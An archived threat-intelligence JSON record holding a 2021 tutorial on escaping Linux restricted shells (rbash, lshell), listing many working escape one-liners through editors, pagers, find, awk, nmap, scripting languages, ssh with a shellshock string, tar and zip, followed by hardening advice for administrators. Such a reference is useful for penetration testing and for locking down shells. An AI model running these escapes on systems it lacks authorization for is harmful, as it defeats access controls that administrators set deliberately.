{
    "id": "cab6df4d-2c07-49c2-92dd-f47be42b0a17",
    "created_at": "2023-02-18T02:08:42.977426Z",
    "updated_at": "2025-03-27T02:16:26.603453Z",
    "deleted_at": null,
    "sha1_hash": "fbe8d30f3f526e44d78673cd60e1daad7e23e452",
    "title": "2021-02-26 - Linux Restricted Shell Bypass",
    "authors": "",
    "file_creation_date": "2023-02-17T01:37:23Z",
    "file_modification_date": "2023-02-17T01:37:23Z",
    "file_size": 231698,
    "plain_text": "# Linux Restricted Shell Bypass\n\n**vk9-sec.com/linux-restricted-shell-bypass**\n\nVry4n_ February 26, 2021\n\nRestricted shells are conceptually shells with restricted permissions, with features and\ncommands working under a very peculiar environment, built to keep users in a secure and\ncontrolled environment, allowing them just the minimum necessary to perform their daily\noperations.\n\nOnce hackers get a low privileged shell, even a restricted one, it’s time to try to escape normal\nrestrictions and get more features and privileges to play with. This is where restricted shell\nescaping techniques come into play. Escaping shell restrictions is just a small part of\nPenetration Testing Post Exploitation phase, designed to escalate privileges.\n\nSometimes a restricted shell can block the commands with / or the redirecting outputs like\n>,>>\n\n### Common Restricted Shells\n\nThere is a lot of different restricted shells to choose from. Some of them are just normal\nshells with some simple common restrictions not actually configurable, such as rbash\n(restricted Bash), rzsh and rksh (Korn Shell in restricted mode), which are really trivial to\nbypass.\n\nOthers have a complete configuration set that can be redesigned to fit administrator’s needs\nsuch as lshell (Limited Shell) and rssh (Restricted Secure Shell).\n\n### Gathering Environment Information\n\nOnce we have access to a restricted shell, before we can go any further on all techniques, the\nfirst step is to gather as much information as possible about our current shell environment.\n\nCheck available commands either by trying them out by hand, hitting TAB key twice or\nlisting files and directories;\nCheck for commands configured with SUID permissions, especially if they are owned\nby root user. If these commands have escapes, they can be run with root permissions\nand will be our way out, or in.\nCheck variables ‘env’ or ‘printenv’\nCheck the list of commands you can use with sudo. This will let us execute commands\nwith other user’s permissions by using our own password. This is especially good when\nconfigured for commands with escape features. (sudo -l)\n\n\n-----\n\nCheck what languages are at your disposal, such as python, expect, perl, ruby, etc. They\nwill come in handy later on;\nCheck if redirect operators are available, such as '|' (pipe), “>”, “>>”, “<”;\nCheck for escape characters and execution tags such as: “;” (colon), “&” (background\nsupport), “’” (single quotes), “” (double-quotes), “$(“ (shell execution tag), “${“\nYou must to check in what shell you are : echo $SHELL you will be in rbash by 90%\n\nTry to determine what kind of shell you are in. This is not easy depending on the\nconfiguration in place, but can be performed by issuing some commands and checking for\ngeneral error messages.\n\nIf some available command is unknown to you, install them in your own test Linux box\nand analyze its features, manual, etc.\nTry to determine what kind of shell you are in. This is not easy depending on the\nconfiguration in place, but can be performed by issuing some commands and checking\nfor general error messages.\n\nHere are some error message examples from different restricted shells around\n\nrbash\n\nrzsh\n\nrksh\n\nlshell\n\n## Common Initial Techniques\n\nIf \"/\" is allowed you can run /bin/sh or /bin/bash.\n\n\n-----\n\nIf you can run cp command you can copy the /bin/sh or /bin/bash into your directory.\nFrom ftp >\n\n!/bin/sh or !/bin/bash\ngdb >\n\ngdb\n!/bin/sh or !/bin/bash\nFrom more/man/less >\n\n!/bin/sh or !/bin/bash\nFrom vim >\n\nvim\n!/bin/sh #or !/bin/bash :set shell=/bin/bash\nFrom rvim >\n\nrvim\n:python import os; os.system(\"/bin/bash )\nFrom scp >\n\nscp -S /path/yourscript x y:\nFrom awk >\n\nawk 'BEGIN {system(\"/bin/sh”) }' # or /bin/bash\")}'\nFrom find >\n\nfind / -name test -exec /bin/sh or /bin/bash \\;\nFrom nmap >\n\nnmap --interactive\n!sh\nFrom find >\n\nfind . -name * -exec /bin/bash \\;\nFrom mutt\n\nmutt\n!\n/bin/bash\n\n**Console Editors**\n\nLinux systems provide us with different editors such as ed, ne, nano, pico, vim, etc.\n\n**Vi or VIM**\n\necho $0\nvi newfile.txt\n:set shell=/bin/bash # or !/bin/bash\necho $0\n\n**ed**\n\necho $0\n\n\n-----\n\ned\n!'/bin/bash'\necho $0\n\n**Pager Commands**\n\nLinux pagers are simple utilities that allow us to see the output of a particular command or\ntext file, that is too big to fit the screen, in a paged way. The most well-known are “more” and\n“less”. Pagers also have escape features to execute scripts.\n\n**less/more**\n\necho $0\necho “Vry4n” | less\n!'/bin/bash'\necho $0\n\n**man command**\n\nThe command “man”, used to display manual pages for Linux commands, also has escape\nfeatures. Simply use the man command to display any command manual\n\necho $0\nman ls\n!'/bin/bash'\necho $0\n\n\n-----\n\n**pinfo**\n\nwe can read files\n\npinfo ls\n!\nls /etc\n\n## Programming Languages Techniques\n\nLet’s look some programming languages techniques.\n\n\n-----\n\nFrom expect >\n\nexpect spawn sh\nsh\nFrom python >\n\npython -c 'import os; os.system(\"/bin/sh\")'\nFrom php >\n\nphp -a\nexec(\"sh -i\");\nFrom perl >\n\nperl -e 'exec \"/bin/sh\";'\nFrom lua >\n\nlua\nos.execute('/bin/sh').\nFrom ruby >\n\nirb\nexec \"/bin/sh\"\n\n## Advanced Techniques\n\nNow let's move into some dirty advance techniques.\n\nFrom ssh >\n\nssh username@IP - t \"/bin/sh\" or \"/bin/bash\"\nFrom ssh2 >\n\nssh username@IP -t \"bash --noprofile\"\nFrom ssh3 >\n\nssh username@IP -t \"() { :; }; /bin/bash\" (shellshock)\nFrom ssh4 >\n\nssh -o ProxyCommand=\"sh -c /tmp/yourfile.sh\" 127.0.0.1 (SUID)\nFrom git >\n\ngit help status > you can run it then !/bin/bash\nFrom pico >\n\npico -s \"/bin/bash\" then you can write /bin/bash and then CTRL + T\nFrom zip >\n\nzip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\"\nFrom tar >\n\ntar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash\n\n## Best Practices & Conclusion\n\n\n-----\n\nPrefer to work with Allowed commands instead of Disallowed commands . The\namount of commands with escapes you don’t know are far superior than the ones you\ndo.\nKeep “Allowed Commands” list to a minimum necessary.\nInspect your allowed commands for escaping features on a regular basis, either by\nstudying the manual or search in the security community.\nCheck allowed commands that could interact with Linux system variables and restrict\ntheir access.\nScripts that invoke other scripts can be a security risk specially when they are running\nwith other user’s privileges and software that allow escape or third party command\nexecution. Try to avoid this.\nIf any command allowed has escapes or command execution features, avoid using it. If\nnot possible try to enforce restrictions to block certain functions or use restricted\nversions. Some commands have restricted versions with no command execution\nsupport.\nIf providing Linux editors is inevitable, use restricted versions, such as:\n\nvim = rvim (Restricted Vim)\n\ned = red (Restricted ED)\n\nnano = rnano (Restricted Nano)\n\nA nice hint for restricted software would be to provide them as a symbolic link. For all\npurposes your user might think it’s using vim, for example, while it’s just a symbolic\nlink to rvim.\nIf providing pagers is necessary avoid less and more, and use pages that don’t provide\ncommand execution escape like most.\nWhen using any software that has built-in third party editors support that rely on\n$EDITOR and $VISUAL Linux variables, make these variables read-only to avoid users\nchanging it’s content to software containing escapes.\nTry to avoid allowing programming languages. If not possible ensure that configuration\nis hardened and dangerous functions such as pty(), system(), exec(), etc, are blocked.\nSome programming languages are easy to harden simply defining functions that are\ndisabled, others are trickier and sometimes the only way to do it is either uninstalling\ncertain functions or not providing the language itself.\n\n### Resources\n\n[https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\n\n[https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Evasion/2021-02-26 - Linux Restricted Shell Bypass.pdf"
    ],
    "report_names": [
        "2021-02-26 - Linux Restricted Shell Bypass.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1676686122,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1676597843,
    "ts_modification_date": 1676597843,
    "files": {
        "pdf": "https://archive.orkl.eu/fbe8d30f3f526e44d78673cd60e1daad7e23e452.pdf",
        "text": "https://archive.orkl.eu/fbe8d30f3f526e44d78673cd60e1daad7e23e452.txt",
        "img": "https://archive.orkl.eu/fbe8d30f3f526e44d78673cd60e1daad7e23e452.jpg"
    }
}